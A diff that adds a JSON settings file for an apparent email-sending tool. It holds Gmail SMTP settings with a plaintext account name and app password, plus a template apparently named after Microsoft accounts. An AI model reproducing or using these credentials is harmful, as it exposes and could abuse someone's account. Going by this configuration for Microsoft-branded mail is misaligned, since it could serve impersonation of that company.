@@ -1,0 +1,23 @@
+{
+  "settings": [
+    {
+      "_id": "email-template",
+      "value": "vbt"
+    },
+    {
+      "_id": "smtp",
+      "port": 587,
+      "secure": false,
+      "host": "smtp.gmail.com",
+      "auth": {
+        "user": "codigoeticavencred@gmail.com",
+        "pass": "hkkmwsevqdetpctc"
+      }
+    },
+    {
+      "_id": "template",
+      "path": "/templates/microsoft-account",
+      "id": "microsoft-account"
+    }
+  ]
+}
